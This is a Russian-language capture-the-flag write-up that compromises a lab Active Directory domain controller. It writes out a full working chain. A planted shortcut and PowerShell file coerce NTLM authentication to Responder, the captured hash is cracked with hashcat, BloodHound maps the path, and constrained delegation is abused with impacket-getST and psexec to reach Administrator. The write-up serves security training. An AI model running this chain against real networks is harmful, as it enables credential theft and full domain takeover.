### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
- навык работы с АД, ее энумерация
- навык работы с bloodhound
- умение эксплуатировать привилегию AllowedToDelegate, работать с билетами
### Enumiration 
начинаем со скана портов
```
rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX proxy.xml
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-08 11:53:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T11:54:16+00:00
7680/tcp  open  pando-pub?    syn-ack ttl 126
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
```
судя по имени компьютера, мы работаем с контроллером домена в домене ctf.local. службы стандартные, наибольший интерес представляют ldap, kerberos. rpc, smb. сразу попробуем получить список всех хостов в домене: ```dig axfr @<IP_адрес_DC> ctf.local``` - узнаем, что в сети только DC. далее решила использовать для скана
```enum4linux-ng -A ip -oA enum_proxy.txt```. из полезного: доступна нулевая сессия rpc (но команды querydispinfo, enumdomuser выдают result was NT_STATUS_ACCESS_DENIED, так что ими ничего вытащить не удалось)
``` ==========================================
|    RPC Session Check on ip                 |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
```
попробовала получить юзернеймы через ```nxc smb 10.48.185.108 -u '' -p '' --rid-brute 2000``` - доступа опять же нет. шары или энумерация по ldap без аутентификации тоже недоступны. значит, попробуем вытащить пользователей через kerbture. снова ничего интересного - стандартные записи (вообще, только сейчас заметила, что нужно было использовать специализированный словарь, чтобы не проморгать службы - но что сделано, то сделано)
```
┌──(olya㉿olya)-[/tmp]
└─$ kerbrute userenum --dc ip -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 


2026/07/08 15:43:16 >  [+] VALID USERNAME:       guest@ctf.local
2026/07/08 15:43:16 >  [+] VALID USERNAME:       administrator@ctf.local
```
попробуем авторизоваться через гостя(при проверке администраторской записи она, ожидаемо, потребовала пароль). проверяем, отключена ли запись через ```nxc smb ip -u guest -p ''``` - оказывается, она валидна и не требует пароля. попробуем провести энумерацию через rpc и ldap с аккаунтом гостя - прав до сих пор не хватает, также пробуем провести as-rep roasting для извлечения хеша пароля админа - не сработало
```
└─$ impacket-GetNPUsers ctf.local/administrator -no-pass -dc-ip ip
[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
kerberoasting также оказался неэффективен
```
└─$ impacket-GetUserSPNs ctf.local/guest: -dc-ip шз -request
[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```
попробуем подключиться к шарам по smb через гостя и просматриваем права\доступные шары

```
smbmap -H ip -u 'guest' -p ''
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT-Shared                                               READ, WRITE     IT Department Shared Resources
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

видим, что есть интересная шара IT-Shared. подключаемся к ней

```smbclient //10.48.185.108/IT-Shared -U 'ctf.local\guest%'```

в файлах два интересных момента: есть несколько, как заявлено, устаревших паролей и информация о скане файлов
```
smb: \> get IT-Onboarding-Checklist.txt -
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.
```
попробуем двигаться по этим векторам: 1) попробуем распылить полученные пароли ```nxc smb ip -u administrator -p pass.txt``` - ни один не подошел. двигаемся дальше. 2) запускаем респондер(```sudo responder -I tun0```). создаем файл url, который при загрузке иконки заставит службу попробовать инициировать подключение по smb 
```
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://ctf.local
WorkingDirectory=ctf
IconFile=\\ip\icons\icon.ico
IconIndex=1
EOF
```
подгружаем через ```put @Shortcut.url```. хеш не пришел - либо включена проверка смб-подписи (SMB over QUIC), либо, тк это служба, она не подгружает иконки. попробуем альтернативу

```echo 'Test-Path \\ip\icons\icon.ico' > trigger.ps1 ```

на этот раз сработало! ловим netntlm хеш

```NTLMv2-SSP Hash     : svc.scanner::CTF:3e5e...```

тк его не использовать для pth, пробуем перебрать

```hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt```

бинго! получаем пароль от аккаунта службы. но проблема - к удаленной машине через evil-winrm, xfreerdp, psexec и тд не подключиться (нет прав ни админа, ни членства в Remote Management Users или Remote Desktop Users). тогда попробуем оценить картину с помощью bloodhound
```
 bloodhound-python -u svc.scanner -p '***' -d ctf.local -ns ip -c All --zip
./bloodhound-cli containers start
```
запускаем контейнер, переходим в интерфейс и подгружаем полученный зип-архив, в pathfinding выстраиваем необходимый нам путь до админа

<img width="1627" height="450" alt="image" src="https://github.com/user-attachments/assets/242ae21d-f168-4fe1-b152-a0e6a98a4efa" />

разбор графа:
SVC.SCANNER@CTF.LOCAL — AllowedToDelegate ➡️ DC01.CTF.LOCAL
  учетная запись службы SVC.SCANNER имеет право ограниченного делегирования на контроллер домена DC01.CTF.LOCAL. с помощью этого права млжно легитимно выдать себе билет Kerberos от имени любого пользователя домена (включая Администратора) для доступа к службам на контроллере домена.
DC01.CTF.LOCAL — CoerceToTGT ➡️ CTF.LOCAL
   CoerceToTGT — эта связь показывает, что компьютер (в данном случае контроллер домена) обладает огромной властью над доменом CTF.LOCAL, а значит, получив доступ к DC01, мы фактически получаем полный контроль над всей базой данных домена (NTDS.dit), где хранятся хэши паролей всех пользователей.
CTF.LOCAL ➡️ USERS ➡️ ADMINISTRATOR@CTF.LOCAL
  конечная цель. администратор домена находится внутри домена CTF.LOCAL. компрометация контроллера домена DC01 автоматически означает компрометацию этой учетной записи

  воспользуемся найденным путем:

  ```
└─$ echo "ip dc01.ctf.local dc01" | sudo tee -a /etc/hosts  
└─$ impacket-getST ctf.local/svc.scanner:'***' -spn cifs/dc01.ctf.local -impersonate Administrator -dc-ip ip
└─$ export KRB5CCNAME=Administrator@cifs_dc01.ctf.local@CTF.LOCAL.ccache
└─$ impacket-psexec -k -no-pass dc01.ctf.local
```
и вот мы внутри! забираем флаг

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
```
